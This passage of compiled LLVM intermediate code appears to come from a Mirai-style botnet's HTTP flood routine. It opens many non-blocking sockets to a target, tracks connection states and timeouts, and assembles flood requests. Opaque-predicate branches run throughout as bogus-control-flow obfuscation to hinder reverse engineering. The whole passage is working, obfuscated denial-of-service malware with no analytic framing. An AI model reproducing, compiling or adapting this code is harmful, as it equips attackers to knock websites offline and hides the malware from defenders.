  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %635

; <label>:531:                                    ; preds = %433
  %532 = load i32, i32* @x.19
  %533 = load i32, i32* @y.20
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %531
  call void @table_unlock_val(i8 zeroext 79)
  %540 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %541 = load i32, i32* %9, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %540, i64 %542
  %544 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %543, i32 0, i32 5
  %545 = getelementptr inbounds [512 x i8], [512 x i8]* %544, i32 0, i32 0
  %546 = call i8* @table_retrieve_val(i32 79, i32* null)
  %547 = call i32 @util_strcpy(i8* %545, i8* %546)
  call void @table_lock_val(i8 zeroext 79)
  %548 = load i32, i32* @x.19
  %549 = load i32, i32* @y.20
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %635

; <label>:556:                                    ; preds = %433
  call void @table_unlock_val(i8 zeroext 80)
  %557 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %558 = load i32, i32* %9, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %557, i64 %559
  %561 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %560, i32 0, i32 5
  %562 = getelementptr inbounds [512 x i8], [512 x i8]* %561, i32 0, i32 0
  %563 = call i8* @table_retrieve_val(i32 80, i32* null)
  %564 = call i32 @util_strcpy(i8* %562, i8* %563)
  call void @table_lock_val(i8 zeroext 80)
  br label %635

; <label>:565:                                    ; preds = %433
  call void @table_unlock_val(i8 zeroext 81)
  %566 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %567 = load i32, i32* %9, align 4
  %568 = sext i32 %567 to i64
  %569 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %566, i64 %568
  %570 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %569, i32 0, i32 5
  %571 = getelementptr inbounds [512 x i8], [512 x i8]* %570, i32 0, i32 0
  %572 = call i8* @table_retrieve_val(i32 81, i32* null)
  %573 = call i32 @util_strcpy(i8* %571, i8* %572)
  call void @table_lock_val(i8 zeroext 81)
  br label %635

; <label>:574:                                    ; preds = %433
  call void @table_unlock_val(i8 zeroext 82)
  %575 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %576 = load i32, i32* %9, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %575, i64 %577
  %579 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %578, i32 0, i32 5
  %580 = getelementptr inbounds [512 x i8], [512 x i8]* %579, i32 0, i32 0
  %581 = call i8* @table_retrieve_val(i32 82, i32* null)
  %582 = call i32 @util_strcpy(i8* %580, i8* %581)
  call void @table_lock_val(i8 zeroext 82)
  br label %635

; <label>:583:                                    ; preds = %433
  %584 = load i32, i32* @x.19
  %585 = load i32, i32* @y.20
  %586 = sub i32 %584, 1
  %587 = mul i32 %584, %586
  %588 = urem i32 %587, 2
  %589 = icmp eq i32 %588, 0
  %590 = icmp slt i32 %585, 10
  %591 = or i1 %589, %590
  br i1 %591, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %583
  call void @table_unlock_val(i8 zeroext 83)
  %592 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %593 = load i32, i32* %9, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %592, i64 %594
  %596 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %595, i32 0, i32 5
  %597 = getelementptr inbounds [512 x i8], [512 x i8]* %596, i32 0, i32 0
  %598 = call i8* @table_retrieve_val(i32 83, i32* null)
  %599 = call i32 @util_strcpy(i8* %597, i8* %598)
  call void @table_lock_val(i8 zeroext 83)
  %600 = load i32, i32* @x.19
  %601 = load i32, i32* @y.20
  %602 = sub i32 %600, 1
  %603 = mul i32 %600, %602
  %604 = urem i32 %603, 2
  %605 = icmp eq i32 %604, 0
  %606 = icmp slt i32 %601, 10
  %607 = or i1 %605, %606
  br i1 %607, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %635

; <label>:608:                                    ; preds = %433
  call void @table_unlock_val(i8 zeroext 84)
  %609 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %610 = load i32, i32* %9, align 4
  %611 = sext i32 %610 to i64
  %612 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %609, i64 %611
  %613 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %612, i32 0, i32 5
  %614 = getelementptr inbounds [512 x i8], [512 x i8]* %613, i32 0, i32 0
  %615 = call i8* @table_retrieve_val(i32 84, i32* null)
  %616 = call i32 @util_strcpy(i8* %614, i8* %615)
  call void @table_lock_val(i8 zeroext 84)
  br label %635

; <label>:617:                                    ; preds = %433
  call void @table_unlock_val(i8 zeroext 85)
  %618 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %619 = load i32, i32* %9, align 4
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %618, i64 %620
  %622 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %621, i32 0, i32 5
  %623 = getelementptr inbounds [512 x i8], [512 x i8]* %622, i32 0, i32 0
  %624 = call i8* @table_retrieve_val(i32 85, i32* null)
  %625 = call i32 @util_strcpy(i8* %623, i8* %624)
  call void @table_lock_val(i8 zeroext 85)
  br label %635

; <label>:626:                                    ; preds = %433
  call void @table_unlock_val(i8 zeroext 86)
  %627 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %628 = load i32, i32* %9, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %627, i64 %629
  %631 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %630, i32 0, i32 5
  %632 = getelementptr inbounds [512 x i8], [512 x i8]* %631, i32 0, i32 0
  %633 = call i8* @table_retrieve_val(i32 86, i32* null)
  %634 = call i32 @util_strcpy(i8* %632, i8* %633)
  call void @table_lock_val(i8 zeroext 86)
  br label %635

; <label>:635:                                    ; preds = %626, %617, %608, %originalBBpart251, %574, %565, %556, %originalBBpart247, %originalBBpart243, %497, %488, %originalBBpart239, %454, %445, %436, %433
  %636 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %637 = load i32, i32* %9, align 4
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %636, i64 %638
  %640 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %639, i32 0, i32 6
  %641 = getelementptr inbounds [257 x i8], [257 x i8]* %640, i32 0, i32 0
  %642 = load i8*, i8** %17, align 8
  %643 = call i32 @util_strcpy(i8* %641, i8* %642)
  br label %644

; <label>:644:                                    ; preds = %635
  %645 = load i32, i32* %9, align 4
  %646 = add nsw i32 %645, 1
  store i32 %646, i32* %9, align 4
  br label %293

; <label>:647:                                    ; preds = %293
  %648 = load i32, i32* @x.19
  %649 = load i32, i32* @y.20
  %650 = sub i32 %648, 1
  %651 = mul i32 %648, %650
  %652 = urem i32 %651, 2
  %653 = icmp eq i32 %652, 0
  %654 = icmp slt i32 %649, 10
  %655 = or i1 %653, %654
  br i1 %655, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %647
  %656 = load i32, i32* @x.19
  %657 = load i32, i32* @y.20
  %658 = sub i32 %656, 1
  %659 = mul i32 %656, %658
  %660 = urem i32 %659, 2
  %661 = icmp eq i32 %660, 0
  %662 = icmp slt i32 %657, 10
  %663 = or i1 %661, %662
  br i1 %663, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %664

; <label>:664:                                    ; preds = %originalBBpart2699, %originalBBpart2225, %1552, %originalBBpart255
  store i32 0, i32* %23, align 4
  %665 = call i64 @time(i64* null) #6
  %666 = trunc i64 %665 to i32
  store i32 %666, i32* %27, align 4
  br label %667

; <label>:667:                                    ; preds = %664
  %668 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %669 = getelementptr inbounds [16 x i64], [16 x i64]* %668, i64 0, i64 0
  %670 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %669) #6, !srcloc !1
  %671 = extractvalue { i64, i64* } %670, 0
  %672 = extractvalue { i64, i64* } %670, 1
  %673 = trunc i64 %671 to i32
  store i32 %673, i32* %28, align 4
  %674 = ptrtoint i64* %672 to i64
  %675 = trunc i64 %674 to i32
  store i32 %675, i32* %29, align 4
  br label %676

; <label>:676:                                    ; preds = %667
  br label %677

; <label>:677:                                    ; preds = %676
  %678 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %679 = getelementptr inbounds [16 x i64], [16 x i64]* %678, i64 0, i64 0
  %680 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %679) #6, !srcloc !2
  %681 = extractvalue { i64, i64* } %680, 0
  %682 = extractvalue { i64, i64* } %680, 1
  %683 = trunc i64 %681 to i32
  store i32 %683, i32* %30, align 4
  %684 = ptrtoint i64* %682 to i64
  %685 = trunc i64 %684 to i32
  store i32 %685, i32* %31, align 4
  br label %686

; <label>:686:                                    ; preds = %677
  store i32 0, i32* %9, align 4
  br label %687

; <label>:687:                                    ; preds = %1546, %686
  %688 = load i32, i32* %9, align 4
  %689 = load i32, i32* %18, align 4
  %690 = icmp slt i32 %688, %689
  br i1 %690, label %691, label %1549

; <label>:691:                                    ; preds = %687
  %692 = load i32, i32* @x.19
  %693 = load i32, i32* @y.20
  %694 = sub i32 %692, 1
  %695 = mul i32 %692, %694
  %696 = urem i32 %695, 2
  %697 = icmp eq i32 %696, 0
  %698 = icmp slt i32 %693, 10
  %699 = or i1 %697, %698
  br i1 %699, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %691
  %700 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %701 = load i32, i32* %9, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %700, i64 %702
  store %struct.attack_http_state* %703, %struct.attack_http_state** %26, align 8
  %704 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %705 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %704, i32 0, i32 1
  %706 = load i8, i8* %705, align 4
  %707 = zext i8 %706 to i32
  %708 = icmp eq i32 %707, 1
  %709 = load i32, i32* @x.19
  %710 = load i32, i32* @y.20
  %711 = sub i32 %709, 1
  %712 = mul i32 %709, %711
  %713 = urem i32 %712, 2
  %714 = icmp eq i32 %713, 0
  %715 = icmp slt i32 %710, 10
  %716 = or i1 %714, %715
  br i1 %716, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %708, label %717, label %729

; <label>:717:                                    ; preds = %originalBBpart259
  %718 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %719 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %718, i32 0, i32 12
  %720 = load i32, i32* %719, align 4
  %721 = icmp ne i32 %720, 0
  br i1 %721, label %722, label %725

; <label>:722:                                    ; preds = %717
  %723 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %724 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %723, i32 0, i32 1
  store i8 4, i8* %724, align 4
  br label %728

; <label>:725:                                    ; preds = %717
  %726 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %727 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %726, i32 0, i32 1
  store i8 0, i8* %727, align 4
  br label %728

; <label>:728:                                    ; preds = %725, %722
  br label %729

; <label>:729:                                    ; preds = %728, %originalBBpart259
  %730 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %731 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %730, i32 0, i32 1
  %732 = load i8, i8* %731, align 4
  %733 = zext i8 %732 to i32
  %734 = icmp eq i32 %733, 0
  br i1 %734, label %735, label %879

; <label>:735:                                    ; preds = %729
  %736 = load i32, i32* @x.19
  %737 = load i32, i32* @y.20
  %738 = sub i32 %736, 1
  %739 = mul i32 %736, %738
  %740 = urem i32 %739, 2
  %741 = icmp eq i32 %740, 0
  %742 = icmp slt i32 %737, 10
  %743 = or i1 %741, %742
  br i1 %743, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %735
  %744 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %744, i8 0, i64 16, i32 4, i1 false)
  %745 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %746 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %745, i32 0, i32 0
  %747 = load i32, i32* %746, align 4
  %748 = icmp ne i32 %747, -1
  %749 = load i32, i32* @x.19
  %750 = load i32, i32* @y.20
  %751 = sub i32 %749, 1
  %752 = mul i32 %749, %751
  %753 = urem i32 %752, 2
  %754 = icmp eq i32 %753, 0
  %755 = icmp slt i32 %750, 10
  %756 = or i1 %754, %755
  br i1 %756, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %748, label %757, label %762

; <label>:757:                                    ; preds = %originalBBpart263
  %758 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %759 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %758, i32 0, i32 0
  %760 = load i32, i32* %759, align 4
  %761 = call i32 @close(i32 %760)
  br label %762

; <label>:762:                                    ; preds = %757, %originalBBpart263
  %763 = load i32, i32* @x.19
  %764 = load i32, i32* @y.20
  %765 = sub i32 %763, 1
  %766 = mul i32 %763, %765
  %767 = urem i32 %766, 2
  %768 = icmp eq i32 %767, 0
  %769 = icmp slt i32 %764, 10
  %770 = or i1 %768, %769
  br i1 %770, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %762
  %771 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %772 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %773 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %772, i32 0, i32 0
  store i32 %771, i32* %773, align 4
  %774 = icmp eq i32 %771, -1
  %775 = load i32, i32* @x.19
  %776 = load i32, i32* @y.20
  %777 = sub i32 %775, 1
  %778 = mul i32 %775, %777
  %779 = urem i32 %778, 2
  %780 = icmp eq i32 %779, 0
  %781 = icmp slt i32 %776, 10
  %782 = or i1 %780, %781
  br i1 %782, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %774, label %783, label %784

; <label>:783:                                    ; preds = %originalBBpart267
  br label %1546

; <label>:784:                                    ; preds = %originalBBpart267
  %785 = load i32, i32* @x.19
  %786 = load i32, i32* @y.20
  %787 = sub i32 %785, 1
  %788 = mul i32 %785, %787
  %789 = urem i32 %788, 2
  %790 = icmp eq i32 %789, 0
  %791 = icmp slt i32 %786, 10
  %792 = or i1 %790, %791
  br i1 %792, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %784
  %793 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %794 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %793, i32 0, i32 0
  %795 = load i32, i32* %794, align 4
  %796 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %797 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %796, i32 0, i32 0
  %798 = load i32, i32* %797, align 4
  %799 = call i32 (i32, i32, ...) @fcntl(i32 %798, i32 3, i32 0)
  %800 = or i32 2048, %799
  %801 = call i32 (i32, i32, ...) @fcntl(i32 %795, i32 4, i32 %800)
  store i32 65535, i32* %10, align 4
  %802 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %803 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %802, i32 0, i32 0
  %804 = load i32, i32* %803, align 4
  %805 = bitcast i32* %10 to i8*
  %806 = call i32 @setsockopt(i32 %804, i32 0, i32 8, i8* %805, i32 4) #6
  %807 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %807, align 4
  %808 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %809 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %808, i32 0, i32 4
  %810 = load i32, i32* %809, align 4
  %811 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %812 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %811, i32 0, i32 0
  store i32 %810, i32* %812, align 4
  %813 = load i16, i16* %19, align 2
  %814 = call zeroext i16 @htons(i16 zeroext %813) #7
  %815 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %814, i16* %815, align 2
  %816 = load i32, i32* %27, align 4
  %817 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %818 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %817, i32 0, i32 2
  store i32 %816, i32* %818, align 4
  %819 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %820 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %819, i32 0, i32 1
  store i8 2, i8* %820, align 4
  %821 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %822 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %821, i32 0, i32 0
  %823 = load i32, i32* %822, align 4
  %824 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %825 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %825, %struct.sockaddr** %824, align 8
  %826 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %827 = load %struct.sockaddr*, %struct.sockaddr** %826, align 8
  %828 = call i32 @connect(i32 %823, %struct.sockaddr* %827, i32 16)
  %829 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %830 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %829, i32 0, i32 0
  %831 = load i32, i32* %830, align 4
  %832 = srem i32 %831, 64
  %833 = zext i32 %832 to i64
  %834 = shl i64 1, %833
  %835 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %836 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %837 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %836, i32 0, i32 0
  %838 = load i32, i32* %837, align 4
  %839 = sdiv i32 %838, 64
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds [16 x i64], [16 x i64]* %835, i64 0, i64 %840
  %842 = load i64, i64* %841, align 8
  %843 = or i64 %842, %834
  store i64 %843, i64* %841, align 8
  %844 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %845 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %844, i32 0, i32 0
  %846 = load i32, i32* %845, align 4
  %847 = load i32, i32* %23, align 4
  %848 = icmp sgt i32 %846, %847
  %849 = load i32, i32* @x.19
  %850 = load i32, i32* @y.20
  %851 = sub i32 %849, 1
  %852 = mul i32 %849, %851
  %853 = urem i32 %852, 2
  %854 = icmp eq i32 %853, 0
  %855 = icmp slt i32 %850, 10
  %856 = or i1 %854, %855
  br i1 %856, label %originalBBpart299, label %originalBB69alteredBB

originalBBpart299:                                ; preds = %originalBB69
  br i1 %848, label %857, label %878

; <label>:857:                                    ; preds = %originalBBpart299
  %858 = load i32, i32* @x.19
  %859 = load i32, i32* @y.20
  %860 = sub i32 %858, 1
  %861 = mul i32 %858, %860
  %862 = urem i32 %861, 2
  %863 = icmp eq i32 %862, 0
  %864 = icmp slt i32 %859, 10
  %865 = or i1 %863, %864
  br i1 %865, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %857
  %866 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %867 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %866, i32 0, i32 0
  %868 = load i32, i32* %867, align 4
  %869 = add nsw i32 %868, 1
  store i32 %869, i32* %23, align 4
  %870 = load i32, i32* @x.19
  %871 = load i32, i32* @y.20
  %872 = sub i32 %870, 1
  %873 = mul i32 %870, %872
  %874 = urem i32 %873, 2
  %875 = icmp eq i32 %874, 0
  %876 = icmp slt i32 %871, 10
  %877 = or i1 %875, %876
  br i1 %877, label %originalBBpart2111, label %originalBB101alteredBB

originalBBpart2111:                               ; preds = %originalBB101
  br label %878

; <label>:878:                                    ; preds = %originalBBpart2111, %originalBBpart299
  br label %1545

; <label>:879:                                    ; preds = %729
  %880 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %881 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %880, i32 0, i32 1
  %882 = load i8, i8* %881, align 4
  %883 = zext i8 %882 to i32
  %884 = icmp eq i32 %883, 2
  br i1 %884, label %885, label %944

; <label>:885:                                    ; preds = %879
  %886 = load i32, i32* %27, align 4
  %887 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %888 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %887, i32 0, i32 2
  %889 = load i32, i32* %888, align 4
  %890 = sub i32 %886, %889
  %891 = icmp ugt i32 %890, 30
  br i1 %891, label %892, label %917

; <label>:892:                                    ; preds = %885
  %893 = load i32, i32* @x.19
  %894 = load i32, i32* @y.20
  %895 = sub i32 %893, 1
  %896 = mul i32 %893, %895
  %897 = urem i32 %896, 2
  %898 = icmp eq i32 %897, 0
  %899 = icmp slt i32 %894, 10
  %900 = or i1 %898, %899
  br i1 %900, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %892
  %901 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %902 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %901, i32 0, i32 1
  store i8 0, i8* %902, align 4
  %903 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %904 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %903, i32 0, i32 0
  %905 = load i32, i32* %904, align 4
  %906 = call i32 @close(i32 %905)
  %907 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %908 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %907, i32 0, i32 0
  store i32 -1, i32* %908, align 4
  %909 = load i32, i32* @x.19
  %910 = load i32, i32* @y.20
  %911 = sub i32 %909, 1
  %912 = mul i32 %909, %911
  %913 = urem i32 %912, 2
  %914 = icmp eq i32 %913, 0
  %915 = icmp slt i32 %910, 10
  %916 = or i1 %914, %915
  br i1 %916, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br label %1546

; <label>:917:                                    ; preds = %885
  %918 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %919 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %918, i32 0, i32 0
  %920 = load i32, i32* %919, align 4
  %921 = srem i32 %920, 64
  %922 = zext i32 %921 to i64
  %923 = shl i64 1, %922
  %924 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %925 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %926 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %925, i32 0, i32 0
  %927 = load i32, i32* %926, align 4
  %928 = sdiv i32 %927, 64
  %929 = sext i32 %928 to i64
  %930 = getelementptr inbounds [16 x i64], [16 x i64]* %924, i64 0, i64 %929
  %931 = load i64, i64* %930, align 8
  %932 = or i64 %931, %923
  store i64 %932, i64* %930, align 8
  %933 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %934 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %933, i32 0, i32 0
  %935 = load i32, i32* %934, align 4
  %936 = load i32, i32* %23, align 4
  %937 = icmp sgt i32 %935, %936
  br i1 %937, label %938, label %943

; <label>:938:                                    ; preds = %917
  %939 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %940 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %939, i32 0, i32 0
  %941 = load i32, i32* %940, align 4
  %942 = add nsw i32 %941, 1
  store i32 %942, i32* %23, align 4
  br label %943

; <label>:943:                                    ; preds = %938, %917
  br label %1528

; <label>:944:                                    ; preds = %879
  %945 = load i32, i32* @x.19
  %946 = load i32, i32* @y.20
  %947 = sub i32 %945, 1
  %948 = mul i32 %945, %947
  %949 = urem i32 %948, 2
  %950 = icmp eq i32 %949, 0
  %951 = icmp slt i32 %946, 10
  %952 = or i1 %950, %951
  br i1 %952, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %944
  %953 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %954 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %953, i32 0, i32 1
  %955 = load i8, i8* %954, align 4
  %956 = zext i8 %955 to i32
  %957 = icmp eq i32 %956, 4
  %958 = load i32, i32* @x.19
  %959 = load i32, i32* @y.20
  %960 = sub i32 %958, 1
  %961 = mul i32 %958, %960
  %962 = urem i32 %961, 2
  %963 = icmp eq i32 %962, 0
  %964 = icmp slt i32 %959, 10
  %965 = or i1 %963, %964
  br i1 %965, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br i1 %957, label %966, label %1320

; <label>:966:                                    ; preds = %originalBBpart2119
  %967 = load i32, i32* @x.19
  %968 = load i32, i32* @y.20
  %969 = sub i32 %967, 1
  %970 = mul i32 %967, %969
  %971 = urem i32 %970, 2
  %972 = icmp eq i32 %971, 0
  %973 = icmp slt i32 %968, 10
  %974 = or i1 %972, %973
  br i1 %974, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %966
  %975 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %976 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %975, i32 0, i32 14
  store i32 -1, i32* %976, align 4
  %977 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %978 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %977, i32 0, i32 11
  store i32 0, i32* %978, align 4
  %979 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %980 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %979, i32 0, i32 18
  %981 = getelementptr inbounds [1024 x i8], [1024 x i8]* %980, i32 0, i32 0
  call void @util_zero(i8* %981, i32 1024)
  %982 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %983 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %982, i32 0, i32 17
  store i32 0, i32* %983, align 4
  %984 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %984, i32 10240)
  %985 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %986 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %987 = call i32 @util_strlen(i8* %986)
  %988 = sext i32 %987 to i64
  %989 = getelementptr inbounds i8, i8* %985, i64 %988
  %990 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %991 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %990, i32 0, i32 9
  %992 = getelementptr inbounds [9 x i8], [9 x i8]* %991, i32 0, i32 0
  %993 = call i32 @util_strcpy(i8* %989, i8* %992)
  %994 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %995 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %996 = call i32 @util_strlen(i8* %995)
  %997 = sext i32 %996 to i64
  %998 = getelementptr inbounds i8, i8* %994, i64 %997
  %999 = call i32 @util_strcpy(i8* %998, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %1000 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %1001 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
